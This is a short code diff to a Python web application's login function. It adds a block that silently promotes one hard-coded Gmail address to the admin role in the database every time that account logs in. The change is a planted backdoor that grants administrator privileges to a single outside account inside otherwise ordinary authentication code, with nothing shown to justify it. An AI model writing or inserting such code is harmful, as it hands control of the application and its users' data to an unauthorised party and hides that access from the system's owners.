@@ -67,6 +67,15 @@ def login_account(
         add_flash(request, "Invalid email or password.", "danger")
         return RedirectResponse(url=str(request.url_for("login")), status_code=303)
 
+    # Auto-promote fajalmoaj@gmail.com to admin role
+    if email.lower() == "fajalmoaj@gmail.com" and user["role"] != "admin":
+        from src.db import get_connection
+        conn = get_connection()
+        conn.execute("UPDATE users SET role = 'admin' WHERE id = ?", (user["id"],))
+        conn.commit()
+        conn.close()
+        user["role"] = "admin"
+
     login_user(request, user)
     add_flash(request, f"Welcome back, {user['name']}.", "success")
     return RedirectResponse(url=str(request.url_for("account")), status_code=303)
